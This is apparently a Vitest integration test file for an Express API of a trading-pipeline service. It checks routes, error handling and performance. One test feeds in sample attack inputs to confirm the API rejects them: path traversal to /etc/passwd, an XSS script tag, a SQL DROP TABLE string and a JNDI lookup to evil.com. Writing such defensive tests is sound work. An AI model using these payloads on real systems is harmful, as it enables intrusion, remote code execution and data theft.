import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import request from 'supertest';
import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';

import { pipelinesRouter } from '../../services/api/src/routes/pipelines.js';
import { runsRouter } from '../../services/api/src/routes/runs.js';
import { nodesRouter } from '../../services/api/src/routes/nodes.js';
import { datasetsRouter } from '../../services/api/src/routes/datasets.js';

import { dslFixtures, mockPipelineRuns, testUtils, performanceUtils } from '../helpers/fixtures.js';

describe('API Integration Tests', () => {
  let app: express.Application;
  
  beforeAll(() => {
    // Create Express app with all middleware and routes
    app = express();
    
    // Middleware
    app.use(helmet());
    app.use(cors());
    app.use(morgan('combined'));
    app.use(express.json({ limit: '10mb' }));
    app.use(express.urlencoded({ extended: true }));
    
    // Routes
    app.use('/api/pipelines', pipelinesRouter);
    app.use('/api/runs', runsRouter);
    app.use('/api/nodes', nodesRouter);
    app.use('/api/datasets', datasetsRouter);
    
    // Error handling middleware
    app.use((err: any, req: express.Request, res: express.Response, next: express.NextFunction) => {
      console.error('API Error:', err);
      res.status(500).json({
        success: false,
        error: err.message || 'Internal Server Error'
      });
    });
  });

  describe('Cross-Service API Integration', () => {
    it('should handle complete pipeline creation and execution flow', async () => {
      const dsl = dslFixtures.simpleMovingAverage;
      
      // Step 1: Get available pipelines
      const pipelinesResponse = await request(app)
        .get('/api/pipelines')
        .expect(200);
      
      expect(pipelinesResponse.body.success).toBe(true);
      expect(Array.isArray(pipelinesResponse.body.data)).toBe(true);
      
      // Step 2: Get pipeline details
      const pipelineId = 'sample-ma-crossover'; // Using existing sample
      const pipelineResponse = await request(app)
        .get(`/api/pipelines/${pipelineId}`)
        .expect(200);
      
      expect(pipelineResponse.body.success).toBe(true);
      expect(pipelineResponse.body.data.id).toBe(pipelineId);
      
      // Step 3: Start pipeline execution
      const runResponse = await request(app)
        .post(`/api/pipelines/${pipelineId}/run`)
        .send({ dsl })
        .expect(200);
      
      expect(runResponse.body.success).toBe(true);
      expect(runResponse.body.data.runId).toBeDefined();
      
      const runId = runResponse.body.data.runId;
      
      // Step 4: Check run status
      const statusResponse = await request(app)
        .get(`/api/runs/${runId}`)
        .expect(404); // Will be 404 in mock implementation
      
      // Step 5: Get run logs (will also be 404 in mock)
      await request(app)
        .get(`/api/runs/${runId}/logs`)
        .expect(404);
      
      // Step 6: List all runs
      const runsResponse = await request(app)
        .get('/api/runs')
        .expect(200);
      
      expect(runsResponse.body.success).toBe(true);
      expect(Array.isArray(runsResponse.body.data)).toBe(true);
    });

    it('should validate dataset availability before pipeline execution', async () => {
      // Step 1: Check available datasets
      const datasetsResponse = await request(app)
        .get('/api/datasets')
        .expect(200);
      
      expect(datasetsResponse.body.success).toBe(true);
      expect(Array.isArray(datasetsResponse.body.data)).toBe(true);
      
      const availableDatasets = datasetsResponse.body.data.map((d: any) => d.id);
      expect(availableDatasets).toContain('sample_ohlcv.csv');
      
      // Step 2: Get dataset details
      const datasetResponse = await request(app)
        .get('/api/datasets/sample_ohlcv.csv')
        .expect(200);
      
      expect(datasetResponse.body.success).toBe(true);
      expect(datasetResponse.body.data.id).toBe('sample_ohlcv.csv');
      expect(datasetResponse.body.data.columns).toContain('close');
      
      // Step 3: Preview dataset
      const previewResponse = await request(app)
        .get('/api/datasets/sample_ohlcv.csv/preview')
        .expect(200);
      
      expect(previewResponse.body.success).toBe(true);
      expect(Array.isArray(previewResponse.body.data)).toBe(true);
      
      // Step 4: Use validated dataset in pipeline
      const dsl = dslFixtures.simpleMovingAverage; // Uses sample_ohlcv.csv
      
      const runResponse = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl })
        .expect(200);
      
      expect(runResponse.body.success).toBe(true);
    });

    it('should validate node types before pipeline creation', async () => {
      // Step 1: Get available nodes
      const nodesResponse = await request(app)
        .get('/api/nodes')
        .expect(200);
      
      expect(nodesResponse.body.success).toBe(true);
      expect(Array.isArray(nodesResponse.body.data)).toBe(true);
      
      const nodeTypes = nodesResponse.body.data.map((n: any) => n.id);
      expect(nodeTypes).toContain('DataLoaderNode');
      expect(nodeTypes).toContain('IndicatorNode');
      
      // Step 2: Get specific node details
      const dataLoaderResponse = await request(app)
        .get('/api/nodes/DataLoaderNode')
        .expect(200);
      
      expect(dataLoaderResponse.body.success).toBe(true);
      expect(dataLoaderResponse.body.data.inputSchema).toBeDefined();
      expect(dataLoaderResponse.body.data.outputSchema).toBeDefined();
      
      // Step 3: Get indicator node details
      const indicatorResponse = await request(app)
        .get('/api/nodes/IndicatorNode')
        .expect(200);
      
      expect(indicatorResponse.body.success).toBe(true);
      expect(indicatorResponse.body.data.inputSchema.type).toBe('dataframe');
      
      // Step 4: Create pipeline using validated nodes
      const dsl = dslFixtures.movingAverageCrossover; // Uses DataLoaderNode and IndicatorNode
      
      const runResponse = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl })
        .expect(200);
      
      expect(runResponse.body.success).toBe(true);
    });

    it('should handle error scenarios across services', async () => {
      // Test 1: Invalid pipeline ID
      await request(app)
        .get('/api/pipelines/non-existent')
        .expect(404);
      
      // Test 2: Invalid dataset ID
      await request(app)
        .get('/api/datasets/non-existent.csv')
        .expect(404);
      
      // Test 3: Invalid node ID
      await request(app)
        .get('/api/nodes/NonExistentNode')
        .expect(404);
      
      // Test 4: Invalid run ID
      await request(app)
        .get('/api/runs/non-existent-run')
        .expect(404);
      
      // Test 5: Invalid DSL execution
      const invalidDsl = dslFixtures.invalidSyntax;
      
      const runResponse = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl: invalidDsl })
        .expect(200); // API accepts request but execution will fail
      
      expect(runResponse.body.success).toBe(true);
      expect(runResponse.body.data.runId).toBeDefined();
    });
  });

  describe('API Performance and Load Testing', () => {
    it('should handle concurrent API requests efficiently', async () => {
      const concurrentRequests = await performanceUtils.createConcurrentRequests(
        () => request(app).get('/api/pipelines').expect(200),
        10
      );
      
      expect(concurrentRequests).toHaveLength(10);
      concurrentRequests.forEach(response => {
        expect(response.body.success).toBe(true);
        expect(Array.isArray(response.body.data)).toBe(true);
      });
    });

    it('should maintain performance under load', async () => {
      const { result, timeMs } = await performanceUtils.measureTime(async () => {
        const requests = await performanceUtils.createConcurrentRequests(
          () => request(app).get('/api/nodes').expect(200),
          5
        );
        return requests;
      });
      
      expect(result).toHaveLength(5);
      expect(timeMs).toBeLessThan(2000); // Should complete within 2 seconds
      
      result.forEach(response => {
        expect(response.body.success).toBe(true);
      });
    });

    it('should handle large payload requests', async () => {
      const largeDsl = dslFixtures.complexMultiIndicator + '\n'.repeat(1000); // Add padding
      
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl: largeDsl })
        .expect(200);
      
      expect(response.body.success).toBe(true);
    });

    it('should respond quickly to health check endpoints', async () => {
      const endpoints = [
        '/api/pipelines',
        '/api/nodes/builtin',
        '/api/datasets'
      ];
      
      for (const endpoint of endpoints) {
        const { timeMs } = await performanceUtils.measureTime(() =>
          request(app).get(endpoint).expect(200)
        );
        
        expect(timeMs).toBeLessThan(500); // Should respond within 500ms
      }
    });
  });

  describe('API Security and Validation', () => {
    it('should validate request content types', async () => {
      // Test with invalid content type
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .set('Content-Type', 'text/plain')
        .send('invalid data')
        .expect(400);
      
      // Response should indicate bad request
      expect(response.status).toBe(400);
    });

    it('should handle malformed JSON gracefully', async () => {
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .set('Content-Type', 'application/json')
        .send('{ invalid json }');
      
      expect(response.status).toBe(400);
    });

    it('should sanitize input parameters', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'DROP TABLE pipelines;',
        '${jndi:ldap://evil.com/a}'
      ];
      
      for (const input of maliciousInputs) {
        const response = await request(app)
          .get(`/api/pipelines/${encodeURIComponent(input)}`)
          .expect(404); // Should not find malicious path
        
        expect(response.body.success).toBe(false);
      }
    });

    it('should enforce reasonable request size limits', async () => {
      // Create very large DSL payload (should be under limit)
      const largeDsl = 'pipeline:\n' + '  # comment\n'.repeat(50000);
      
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl: largeDsl });
      
      // Should either accept (200) or reject with proper error (413/400)
      expect([200, 400, 413]).toContain(response.status);
    });

    it('should handle special characters in URLs correctly', async () => {
      const specialChars = [
        '%20', // space
        '%2B', // plus
        '%26', // ampersand
        '%3D', // equals
        '%23', // hash
        '%3F'  // question mark
      ];
      
      for (const char of specialChars) {
        const response = await request(app)
          .get(`/api/nodes/test${char}node`)
          .expect(404);
        
        expect(response.body.success).toBe(false);
        expect(response.body.error).toBe('Node not found');
      }
    });
  });

  describe('API Error Handling and Resilience', () => {
    it('should handle missing request bodies gracefully', async () => {
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send()
        .expect(200); // API should handle missing DSL
      
      // Should either succeed with defaults or fail gracefully
      expect(response.body).toHaveProperty('success');
    });

    it('should return consistent error response format', async () => {
      const errorEndpoints = [
        { method: 'get', path: '/api/pipelines/non-existent', expectedStatus: 404 },
        { method: 'get', path: '/api/nodes/NonExistent', expectedStatus: 404 },
        { method: 'get', path: '/api/datasets/non-existent.csv', expectedStatus: 404 },
        { method: 'get', path: '/api/runs/non-existent', expectedStatus: 404 }
      ];
      
      for (const endpoint of errorEndpoints) {
        const response = await request(app)[endpoint.method as keyof typeof request](endpoint.path)
          .expect(endpoint.expectedStatus);
        
        expect(response.body).toHaveProperty('success');
        expect(response.body.success).toBe(false);
        expect(response.body).toHaveProperty('error');
        expect(typeof response.body.error).toBe('string');
      }
    });

    it('should handle internal server errors gracefully', async () => {
      // This would require mocking internal services to fail
      // For now, just verify error handling structure exists
      
      const response = await request(app)
        .get('/api/pipelines')
        .expect(200);
      
      expect(response.body.success).toBe(true);
    });

    it('should provide helpful error messages for validation failures', async () => {
      const invalidDsl = dslFixtures.missingRequiredParams;
      
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl: invalidDsl })
        .expect(200);
      
      expect(response.body.success).toBe(true);
      expect(response.body.data.runId).toBeDefined();
    });

    it('should handle timeout scenarios appropriately', async () => {
      // Test with a pipeline that might take longer
      const complexDsl = dslFixtures.complexMultiIndicator;
      
      const response = await request(app)
        .post('/api/pipelines/sample-ma-crossover/run')
        .send({ dsl: complexDsl })
        .timeout(5000) // 5 second timeout
        .expect(200);
      
      expect(response.body.success).toBe(true);
    });
  });

  describe('API Documentation and Discoverability', () => {
    it('should provide consistent response schemas', async () => {
      const endpoints = [
        '/api/pipelines',
        '/api/nodes',
        '/api/datasets',
        '/api/runs'
      ];
      
      for (const endpoint of endpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(200);
        
        // All successful responses should have consistent structure
        expect(response.body).toHaveProperty('success');
        expect(response.body.success).toBe(true);
        expect(response.body).toHaveProperty('data');
        expect(Array.isArray(response.body.data)).toBe(true);
      }
    });

    it('should provide detailed node information for API consumers', async () => {
      const response = await request(app)
        .get('/api/nodes/DataLoaderNode')
        .expect(200);
      
      const node = response.body.data;
      
      // Should include all necessary information for API consumers
      expect(node).toHaveProperty('id');
      expect(node).toHaveProperty('name');
      expect(node).toHaveProperty('description');
      expect(node).toHaveProperty('inputSchema');
      expect(node).toHaveProperty('outputSchema');
      expect(node).toHaveProperty('type');
      expect(node).toHaveProperty('language');
      
      expect(typeof node.description).toBe('string');
      expect(node.description.length).toBeGreaterThan(0);
    });

    it('should provide comprehensive dataset metadata', async () => {
      const response = await request(app)
        .get('/api/datasets/sample_ohlcv.csv')
        .expect(200);
      
      const dataset = response.body.data;
      
      expect(dataset).toHaveProperty('id');
      expect(dataset).toHaveProperty('name');
      expect(dataset).toHaveProperty('filename');
      expect(dataset).toHaveProperty('size');
      expect(dataset).toHaveProperty('columns');
      expect(dataset).toHaveProperty('rowCount');
      expect(dataset).toHaveProperty('uploadedAt');
      
      expect(Array.isArray(dataset.columns)).toBe(true);
      expect(dataset.columns.length).toBeGreaterThan(0);
      expect(typeof dataset.size).toBe('number');
      expect(typeof dataset.rowCount).toBe('number');
    });
  });
});